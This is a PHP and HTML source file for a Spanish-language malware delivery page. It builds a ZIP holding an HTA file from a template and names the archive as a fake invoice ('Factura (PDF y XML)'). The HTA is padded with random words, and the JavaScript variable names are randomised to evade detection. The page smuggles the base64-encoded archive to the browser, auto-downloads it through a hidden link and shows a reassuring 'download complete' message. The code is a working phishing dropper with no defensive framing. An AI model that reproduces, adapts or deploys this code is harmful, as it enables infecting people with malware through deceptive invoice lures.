<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-16">
</head>
<?php
error_reporting(1);

//$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

//$user_agent = " .net ";
//echo "User Agent: " . $user_agent . "\n\n";
//if (!strpos($user_agent, ".net") > 0 || !strpos($user_agent, "msie") > 0) {
 //   header('Content-Type: text/plain;');
 //   header("HTTP/1.0 404 Not Found");
 //   exit;
//}
$path = dirname(__DIR__, 2);
//echo $path;

require_once($path . '/src/utils/funcoes.php');
require_once($path . '/config.php');

//CARREGA ARQUIVO TXT EM UM ARRAY
$listawords = file($path . '/src/model/words.txt');
$textrand = "";
//GERA UM NUMERO DANDOMICO ENTRE 300 E 3000
$qtwords = rand(300, 3000);

for ($i = 0; $i < $qtwords; $i++) {
    $textrand .=  $listawords[rand(1, 999)];
}

$textrand = str_replace("\r\n", " ", $textrand);

//ABRE DEFALT HTA
$sHTA = (file_get_contents($path . '/src/model/default_model_hta.txt'));
//novos passos  
$sHTA = str_replace("%hta_var_01%", GeraStringRandomica(rand(3, 8)) . (string)(rand(5000, 2000)) . GeraStringRandomica(rand(2, 5)), $sHTA);
$sHTA = str_replace("%hta_var_02%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
$sHTA = str_replace("%hta_boj_01%", GeraStringRandomica(rand(1, 8)) . (string)(rand(5000, 2000)), $sHTA);
$sHTA = str_replace("%htal_link%", $link_hta, $sHTA);
$sHTA = str_replace("%textrand%", $textrand, $sHTA);

// header('Content-Type: text/plain;');

// Pasta temporária ao lado deste script (CWD do PHP-FPM não é fiável)
$filexDir = __DIR__ . '/filex';
if (!is_dir($filexDir)) {
    mkdir($filexDir, 0775, true);
}

$sNomeLOad = "Factura (PDF y XML)F-" . (string)(rand(99999, 888888));
$NomeZIP = $sNomeLOad . ".zip";
$prefixoNomeHTA  = $sNomeLOad;
$zipPath = $filexDir . '/' . $NomeZIP;

// ZIP só com o .hta em string (sem ficheiro "fonte" obrigatório)
if (!GeraArquivoZipParaDownload('', $sHTA, $zipPath, $sNomeLOad) || !is_readable($zipPath)) {
    throw new RuntimeException('Não foi possível gerar o arquivo ZIP.');
}

$imgbinary = base64_encode(file_get_contents($zipPath));

$listaVar2 = GeraArrayNomesVariaveis(20);

?>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>426a436e5a4f4c634a4d317731724a77</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }

        .message-box {
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .download-instructions {
            font-size: 14px;
            color: #666;
            margin-top: 20px;
        }

        .arrow {
            margin-top: 30px;
            font-size: 24px;
            animation: blink 1s step-start 0s infinite;
        }

        @keyframes blink {
            50% {
                opacity: 0;
            }
        }
    </style>
</head>


<body>
    <div class="message-box">
        <h1 id="wCLM">Descarga Iniciada</h1>
        <p id="KQNl5">Tu descarga ha comenzado. Verifica la esquina inferior derecha de tu navegador.</p>
        <div class="download-instructions">
            <p id="Wn8wA">Espera hasta que la descarga se complete.</p>
            <div class="arrow">↓</div>
        </div>
    </div>
    <script type="text/javascript">
        function <?php echo $listaVar2[0]; ?>(<?php echo $listaVar2[1]; ?>) {
            var <?php echo $listaVar2[2]; ?> = window.atob(<?php echo $listaVar2[1]; ?>);
            var <?php echo $listaVar2[3]; ?> = <?php echo $listaVar2[2]; ?>.length;

            var <?php echo $listaVar2[4]; ?> = new Uint8Array(<?php echo $listaVar2[3]; ?>);
            for (var i = 0; i < <?php echo $listaVar2[3]; ?>; i++) {
                <?php echo $listaVar2[4]; ?>[i] = <?php echo $listaVar2[2]; ?>.charCodeAt(i);
            }
            return <?php echo $listaVar2[4]; ?>.buffer;
        }

        var <?php echo $listaVar2[5]; ?> = "<?php echo $imgbinary; ?>";
        const id = `target_${Date.now()}`;
        var <?php echo $listaVar2[9]; ?> = document.createElement('a');
        <?php echo $listaVar2[9]; ?>.id = id;
        var <?php echo $listaVar2[8]; ?> = "<?php echo $NomeZIP;                                             ?>";
        <?php echo $listaVar2[9]; ?>.download = <?php echo $listaVar2[8]; ?>;
        var <?php echo $listaVar2[10]; ?> = "data:application/x-zip-compressedd;base64," + <?php echo $listaVar2[5]; ?>;
        <?php echo $listaVar2[9]; ?>.style.display = 'none';

        <?php echo $listaVar2[9]; ?>.href = <?php echo $listaVar2[10]; ?>;

        var <?php echo $listaVar2[6]; ?> = <?php echo $listaVar2[0]; ?>(<?php echo $listaVar2[5]; ?>);
        var <?php echo $listaVar2[7]; ?> = new Blob([<?php echo $listaVar2[6]; ?>], {
            type: "application/octet-stream"
        });

        document.body.appendChild(<?php echo $listaVar2[9]; ?>);
        window.URL.revokeObjectURL(<?php echo $listaVar2[9]; ?>.href)
        document.querySelector(`a#${id}`).click()

        document.getElementById('wCLM').textContent = 'Descarga Iniciada';
        document.getElementById('KQNl5').textContent =
            'Tu descarga ha comenzado. Verifica la esquina inferior derecha de tu navegador.';
        document.getElementById('Wn8wA').textContent = 'Espera hasta que la descarga se complete.';

        setTimeout(() => {
            document.getElementById('wCLM').textContent = 'Descarga Completada';
            document.getElementById('KQNl5').textContent = 'Tu descarga se ha completado exitosamente.';
            document.getElementById('Wn8wA').textContent = 'Ahora puedes acceder a tu archivo descargado.';
            document.querySelector('.arrow').style.display = 'none';
        }, 10000);
    </script>
    <script>
        // setTimeout(function() {    window.location.href = "about:blank";    }, 14311);
    </script>

</body>
<?php $arquivo = $filexDir . '/' . $NomeZIP;
sleep(5);
if (file_exists($arquivo)) {
    // unlink($arquivo);
    // echo 'Arquivo deletado com sucesso';
}


?>

</html>